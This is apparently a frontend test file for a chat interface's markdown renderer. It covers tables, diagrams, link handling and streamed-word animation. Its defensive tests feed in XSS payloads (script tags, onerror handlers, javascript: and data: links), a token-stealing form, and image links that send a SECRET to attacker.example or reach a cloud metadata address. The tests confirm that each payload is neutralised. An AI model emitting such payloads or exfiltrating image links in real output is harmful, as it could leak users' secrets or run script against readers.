import { render, screen, waitFor } from "@testing-library/react";
import { expect, test, vi } from "vitest";

import { Linked, Markdown, StreamingBody } from "@/lib/markdown";

test("raw html in agent prose renders as text instead of vanishing", () => {
  render(<Markdown text={"use <username> as the placeholder, compare a<b and c<d"} />);
  expect(screen.getByText(/use <username> as the placeholder, compare a<b and c<d/)).toBeTruthy();
});

test("single newlines break lines inside a paragraph", () => {
  const { container } = render(<Markdown text={"line one\nline two"} />);
  expect(container.querySelector("br")).not.toBeNull();
});

test("the tag surface renders: tables, quotes, rules, strikethrough, small headings", () => {
  const { container } = render(
    <Markdown
      text={"##### fine print\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n> quoted\n\n---\n\n~~gone~~"}
    />,
  );
  expect(container.querySelector("h5")).not.toBeNull();
  expect(container.querySelector("table")).not.toBeNull();
  expect(container.querySelector("blockquote")).not.toBeNull();
  expect(container.querySelector("hr")).not.toBeNull();
  expect(container.querySelector("del")).not.toBeNull();
  expect((container.firstChild as HTMLElement).className).toContain("typeset");
});

test("prose is drawn bare for the typeset; the code block and the table keep their own chrome", () => {
  const { container } = render(
    <Markdown text={"# head\n\n> quoted\n\n- one\n\n**two**\n\n---"} />,
  );
  const document = container.querySelector(".typeset")!;
  const classed = Array.from(document.querySelectorAll("*")).map((node) => node.className);
  expect(classed.filter(Boolean)).toEqual([]);

  const rich = render(<Markdown text={"| a |\n|---|\n| 1 |\n\n```py\nx = 1\n```"} />);
  expect(rich.container.querySelector("table")?.className).toBeTruthy();
  expect(rich.container.querySelector('[data-streamdown="code-block"]')).not.toBeNull();
});

test("a mermaid fence is drawn as a diagram block, never as highlighted code", async () => {
  const { container } = render(<Markdown text={"```mermaid\nflowchart LR\n  a --> b\n```"} />);
  await screen.findByText(/a --> b/, {}, { timeout: 10000 });
  expect(container.querySelector('[data-streamdown="code-block"]')).toBeNull();
  expect(container.textContent).not.toContain("Mermaid Error");
}, 15000);

test("a diagram is drawn in the palette that paints the page", async () => {
  const { default: mermaid } = await import("mermaid");
  const initialized = vi.spyOn(mermaid, "initialize");
  try {
    document.documentElement.classList.add("dark");
    render(<Markdown text={"```mermaid\nflowchart LR\n  a --> b\n```"} />);
    await waitFor(() => expect(initialized).toHaveBeenCalled(), { timeout: 10000 });
    expect(initialized.mock.calls.at(-1)?.[0]).toMatchObject({ theme: "dark" });

    document.documentElement.classList.remove("dark");
    initialized.mockClear();
    render(<Markdown text={"```mermaid\nflowchart RL\n  b --> a\n```"} />);
    await waitFor(() => expect(initialized).toHaveBeenCalled(), { timeout: 10000 });
    expect(initialized.mock.calls.at(-1)?.[0]).toMatchObject({ theme: "neutral" });
  } finally {
    document.documentElement.classList.remove("dark");
    initialized.mockRestore();
  }
}, 15000);

test("a streamed mermaid fence takes the diagram path too", async () => {
  const { container } = render(<StreamingBody text={"```mermaid\nflowchart LR\n  a --> b\n```"} />);
  await screen.findByText(/a --> b/, {}, { timeout: 10000 });
  expect(container.querySelector('[data-streamdown="code-block"]')).toBeNull();
  expect(container.textContent).not.toContain("Mermaid Error");
}, 15000);

test("raw html renders as visible text, elements and handlers included", () => {
  const { container } = render(
    <Markdown text={'before <img src="x" onerror="alert(1)"> <script>alert(2)</script> after'} />,
  );
  expect(container.querySelector("script")).toBeNull();
  expect(container.querySelector("img")).toBeNull();
  expect(container.textContent).toContain("<script>alert(2)</script>");
  expect(container.textContent).toContain("before");
  expect(container.textContent).toContain("after");
});

test("raw forms and inputs render as visible text, never as controls", () => {
  const { container } = render(
    <Markdown text={'<form action="/steal"><input name="token"><button>go</button></form>'} />,
  );
  expect(container.querySelector("form")).toBeNull();
  expect(container.querySelector("input")).toBeNull();
  expect(container.querySelector("button")).toBeNull();
  expect(container.textContent).toContain('<input name="token">');
});

test("a markdown link renders as a safe link and code renders as code", () => {
  render(<Markdown text={"see [docs](https://example.com/d)\n\n```\nplain\n```"} />);
  const link = screen.getByRole("link", { name: "docs" });
  expect(link.getAttribute("rel")).toBe("noopener noreferrer");
  expect(link.getAttribute("target")).toBe("_blank");
  expect(screen.getByText("plain").closest("pre")).toBeTruthy();
});

test("a link the reader cannot follow stays the words it was written as", () => {
  for (const href of ["javascript:alert(1)", "data:text/html,<script>alert(1)</script>"]) {
    const { container, unmount } = render(<Markdown text={"see [bad](" + href + ") after"} />);
    expect(container.querySelector("a")).toBeNull();
    expect(container.textContent).toContain("bad");
    expect(container.textContent).toContain("after");
    unmount();
  }
});

test("an address a member typed opens, under the same policy a reply's link opens under", () => {
  render(<Linked text={"read https://example.com/d and mail me at mailto:sam@example.com"} />);
  const page = screen.getByRole("link", { name: "https://example.com/d" });
  expect(page.getAttribute("href")).toBe("https://example.com/d");
  expect(page.getAttribute("target")).toBe("_blank");
  expect(page.getAttribute("rel")).toBe("noopener noreferrer");
  expect(screen.getByRole("link", { name: "mailto:sam@example.com" })).toBeTruthy();
});

test("everything a member wrote around the address stays the characters they typed", () => {
  const { container } = render(
    <Linked text={"**hi** see [docs](https://example.com/d) # not a heading"} />,
  );
  expect(container.querySelectorAll("a").length).toBe(1);
  expect(container.querySelector("strong")).toBeNull();
  expect(container.textContent).toBe("**hi** see [docs](https://example.com/d) # not a heading");
});

test("a member's plain words are left as one piece of text", () => {
  const { container } = render(<Linked text={"first\nsecond"} />);
  expect(container.querySelector("a")).toBeNull();
  expect(container.textContent).toBe("first\nsecond");
});

test("an address ends where the address ends, not where the sentence does", () => {
  const cases: Array<[string, string]> = [
    ["see https://example.com/d.", "https://example.com/d"],
    ["see (https://example.com/d) now", "https://example.com/d"],
    ["see https://example.com/a_(b) now", "https://example.com/a_(b)"],
    ["see https://example.com/d, then", "https://example.com/d"],
  ];
  for (const [source, address] of cases) {
    const { container, unmount } = render(<Linked text={source} />);
    expect(container.querySelector("a")?.getAttribute("href")).toBe(address);
    expect(container.textContent).toBe(source);
    unmount();
  }
});

test("a long run of brackets behind an address is trimmed in one pass", () => {
  const run = ")".repeat(50_000);
  const source = `see https://example.com/a_(b)${run} now`;
  const started = performance.now();
  const { container } = render(<Linked text={source} />);
  const spent = performance.now() - started;
  expect(container.querySelector("a")?.getAttribute("href")).toBe("https://example.com/a_(b)");
  expect(container.textContent).toBe(source);
  expect(spent).toBeLessThan(1_000);
});

test("an address a member cannot be sent to stays the words it was typed as", () => {
  for (const source of [
    "try javascript:alert(1) now",
    "try data:text/html,<script>alert(1)</script> now",
    "try file:///etc/passwd now",
    "try www.example.com now",
  ]) {
    const { container, unmount } = render(<Linked text={source} />);
    expect(container.querySelector("a")).toBeNull();
    expect(container.textContent).toBe(source);
    unmount();
  }
});

test("a document parses as one, so link reference definitions resolve", () => {
  render(<Markdown text={"see [docs][ref]\n\n[ref]: https://example.com/d\n"} />);
  expect(screen.getByRole("link", { name: "docs" }).getAttribute("href")).toBe(
    "https://example.com/d",
  );
});

test("a streamed body completes the block still being written", () => {
  const { container } = render(<StreamingBody text={"answering\n\n```py\nprint("} />);
  expect(container.querySelector("pre")?.textContent).toContain("print(");
  const bold = render(<StreamingBody text={"answering **still goi"} />);
  expect(bold.container.querySelector("strong")?.textContent).toBe("still goi");
});

test("an image renders with its source and alt text, and a linked image stays linked", () => {
  render(
    <Markdown
      text={
        "![the chart](/surface/web/files/chart.png)\n\n" +
        "[![badge](" +
        location.origin +
        "/surface/web/files/badge.png)](https://example.com/build)"
      }
    />,
  );
  const chart = screen.getByAltText("the chart");
  expect(chart.getAttribute("src")).toBe("/surface/web/files/chart.png");
  expect(screen.getByAltText("badge").closest("a")?.getAttribute("href")).toBe(
    "https://example.com/build",
  );
});

test("an image from any foreign origin is removed entirely", () => {
  for (const src of [
    "https://attacker.example/p.png?d=SECRET",
    "http://attacker.example/p.png",
    "https://169.254.169.254/latest/meta-data",
  ]) {
    const { container, unmount } = render(<Markdown text={"![leak](" + src + ") after"} />);
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain("after");
    unmount();
  }
});

test("task-list items keep distinguishable checked and unchecked boxes, always disabled", () => {
  const { container } = render(<Markdown text={"- [x] shipped\n- [ ] pending"} />);
  const boxes = Array.from(container.querySelectorAll("input"));
  expect(boxes.length).toBe(2);
  expect(boxes.every((box) => box.getAttribute("type") === "checkbox")).toBe(true);
  expect(boxes.every((box) => box.hasAttribute("disabled"))).toBe(true);
  expect(boxes.filter((box) => (box as HTMLInputElement).checked).length).toBe(1);
});

test("markdown-minted attributes survive", () => {
  const { container } = render(<Markdown text={"3. third\n4. fourth"} />);
  expect(container.querySelector("ol")?.getAttribute("start")).toBe("3");
});

test("a raw-block opener never swallows or activates the prose that follows it", () => {
  const cases: Array<[string, string]> = [
    ["Wrap it in <code> and then compare a<b and c<d", "compare a<b and c<d"],
    ["<kbd> then a<b", "then a<b"],
    ["Use <script> tags. Now compare a<b and c<d.", "compare a<b and c<d."],
  ];
  for (const [source, survives] of cases) {
    const { container, unmount } = render(<Markdown text={source} />);
    expect(container.textContent).toContain(survives);
    unmount();
  }

  const twoParagraphs = render(
    <Markdown text={"In <code>, note that 1<2 and 3<4.\n\nNext paragraph: x<y still?"} />,
  );
  expect(twoParagraphs.container.textContent).toContain("x<y still?");
  twoParagraphs.unmount();

  const minted = render(
    <Markdown
      text={"See <code> then <img/src=/surface/web/files/secret.png alt=x> and <code> <em/x>"}
    />,
  );
  expect(minted.container.querySelector("img")).toBeNull();
  expect(minted.container.querySelector("em")).toBeNull();
});

test("a streaming word animates on the frame that adds it, and never again", () => {
  const { container, rerender } = render(<StreamingBody text={"one two"} />);
  const first = Array.from(container.querySelectorAll("[data-arrive]"));
  expect(first.map((word) => word.textContent)).toEqual(["one ", "two"]);

  rerender(<StreamingBody text={"one two three"} />);
  const then = Array.from(container.querySelectorAll("[data-arrive]"));
  expect(then.map((word) => word.textContent)).toEqual(["one ", "two ", "three"]);
  expect(then[0]).toBe(first[0]);
  expect(then[1]).toBe(first[1]);
  expect(then[2]).not.toBe(first[1]);
});

test("a word that has just landed holds its letters whole, none of them wrapped alone", () => {
  const { container, rerender } = render(<StreamingBody text={"alpha beta"} />);
  rerender(<StreamingBody text={"alpha beta gamma"} />);

  const words = Array.from(container.querySelectorAll("[data-arrive]"));
  expect(words.map((word) => word.textContent)).toEqual(["alpha ", "beta ", "gamma"]);
  for (const word of words) expect(word.children.length).toBe(0);
  expect(container.querySelector("p")!.textContent).toBe("alpha beta gamma");
});

test("a space is never given a span of its own", () => {
  const { container, rerender } = render(<StreamingBody text={"alpha"} />);
  rerender(<StreamingBody text={"alpha beta gamma"} />);
  for (const word of container.querySelectorAll("[data-arrive]")) {
    expect(word.textContent?.trim()).not.toBe("");
  }
  expect(container.querySelector("p")!.textContent).toBe("alpha beta gamma");
});

test("the words of one frame land in order, each numbered against the frame before it", () => {
  const arriving = (container: HTMLElement) =>
    Array.from(container.querySelectorAll("[data-arrive]")).map((word) =>
      word.getAttribute("style"),
    );
  const { container, rerender } = render(<StreamingBody text={"alpha beta gamma"} />);

  rerender(<StreamingBody text={"alpha beta gamma delta epsilon"} />);
  expect(arriving(container).slice(-2)).toEqual(["--arrive: 0;", "--arrive: 1;"]);

  rerender(<StreamingBody text={"alpha beta gamma delta epsilon zeta eta theta"} />);
  expect(arriving(container).slice(-3)).toEqual([
    "--arrive: 0;",
    "--arrive: 1;",
    "--arrive: 2;",
  ]);
  expect(arriving(container).slice(0, 3)).toEqual(["--arrive: 0;", "--arrive: 0;", "--arrive: 0;"]);
});

test("a word already on the page never waits longer than it did, so it cannot arrive twice", () => {
  const number = (word: Element) => Number(/\d+/.exec(word.getAttribute("style") ?? "0")?.[0] ?? 0);
  const numbers = (container: HTMLElement) =>
    Array.from(container.querySelectorAll("[data-arrive]")).map(number);
  const opening = "One paragraph, already read.";
  const { container, rerender } = render(<StreamingBody text={opening} />);
  const first = numbers(container);

  rerender(<StreamingBody text={opening + "\n\nA second one, still being written"} />);
  const then = numbers(container).slice(0, first.length);
  expect(then.every((wait, index) => wait <= first[index])).toBe(true);
});

test("a streamed word keeps the space beside it, whatever stands next to it", () => {
  for (const source of [
    "hello *world* again",
    "use `npm ci` first",
    "see [docs](https://example.com/d) here",
  ]) {
    const { container, unmount } = render(<StreamingBody text={source} />);
    const streamed = container.querySelector("p")!.textContent;
    unmount();
    const settled = render(<Markdown text={source} />);
    expect(streamed).toBe(settled.container.querySelector("p")!.textContent);
    settled.unmount();
  }
});

test("a settled document is drawn whole, so no reader is asked to read it word by word", () => {
  const { container } = render(<Markdown text={"one two three"} />);
  expect(container.querySelector("[data-arrive]")).toBeNull();
  expect(container.querySelector("p")?.textContent).toBe("one two three");
});

test("a fence keeps its own text: code is read in lines, not in words", () => {
  const { container } = render(<StreamingBody text={"```py\nx = 1\n```"} />);
  expect(container.querySelector("code")?.querySelector("[data-arrive]")).toBeNull();
});
